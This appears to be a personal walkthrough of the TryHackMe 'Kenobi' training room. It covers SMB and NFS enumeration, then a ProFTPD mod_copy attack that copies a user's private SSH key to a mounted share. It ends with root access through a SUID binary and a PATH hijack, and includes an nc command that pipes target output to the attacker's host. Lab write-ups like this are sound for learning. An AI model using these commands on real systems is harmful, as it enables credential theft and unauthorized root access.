*2021-08-26*

*kimm3*

# Walkthrough: Kenobi
Platform: TryHackMe

Difficulty: Easy

- [Link](https://tryhackme.com/room/kenobi)

As this is a room on TryHackMe I don't explore every single possibility, I awnser the questions and move on. I won't post any awnsers to questions here, or even refer to them - just showing how to hack the box, as intended.
## Setup
![ll](assets/markdown-img-paste-20210826112245589.png)

```
script history/enum1
export IP=10.10.188.113
ping $IP
```
## Scans and enumeration
`sudo nmap $IP -p- -Pn -A -oA scans/nmap-init`

![nmap-init](assets/markdown-img-paste-20210826143428988.png)

`sudo nmap $IP -Pn -p 445 --script=smb-enum-shares,smb-enum-users`

![nmap-smb](assets/markdown-img-paste-2021082711542957.png)

`smbclient //$IP/anonymous`

![smbclient-get-logtxt](assets/markdown-img-paste-20210827115620291.png)

### Logfile
'log.txt' contains several configurations.

It starts with the generation of a SSH RSA key pair. So we know the location and file names for them:

![ssh-gen](assets/markdown-img-paste-20210827121622981.png)

It also contains the configuration for the proftp daemon, and it has a anonymous user enabled.

![ftpuser](assets/markdown-img-paste-2021082712170594.png)

The server is running as the user kenobi(same as the ssh-keys).

It also contains the samba config.
### NFS
From the inital nmap scan. We have another possibility, the rpcbind service binds to a NFS service.

![nfs](assets/markdown-img-paste-20210827121857507.png)

`sudo nmap $IP -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount`

![nmap-nfs](assets/markdown-img-paste-20210827122105365.png)

The `/var` folder is shared.
## Foothold/Exploit
Plan: Copy kenobis private ssh key using the mod_copy [vulnerability](https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/) to the `/var` folder, retrieve it and log in as kenobi.

```
mkdir mnt
sudo mount $IP:/var mnt
ls -la mnt
nc $IP 21
site CPFR /home/kenobi/.ssh/id_rsa
site CPTO /var/tmp/id_rsa
cp mnt/id_rsa creds
chmod 600 creds/id_rsa
ssh -i creds/id_rsa kenobi@$IP
```

![mntfolder](assets/markdown-img-paste-20210827123443854.png)

![ftpcopy](assets/markdown-img-paste-20210827123457513.png)

![sshsuccess-usertxt](assets/markdown-img-paste-20210827123657453.png)
## Privilege Escalation
Search for files with setUID-bit set.

```
#on host
nc -lp 1234 > foundfiles/setUIDsearch.txt

# on target
find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null | nc 10.8.210.115 1234
```

![setUIDsearch](assets/markdown-img-paste-20210827124253258.png)

`/usr/bin/menu` is not standard.

![menu](assets/markdown-img-paste-2021082712442919.png)

Seems to be running common commands to show info about target machine.

`strings /usr/bin/menu`

![strings-menu](assets/markdown-img-paste-20210827124402562.png)

It runs curl, ifconfig and uname - with relative paths. We can tamper with the path of kenobi to use this.

```
echo "/bin/bash" > curl
chmod 770 curl
echo PATH=/home/kenobi:$PATH
menu
# choose 1
```

![roottxt](assets/markdown-img-paste-20210827124829946.png)
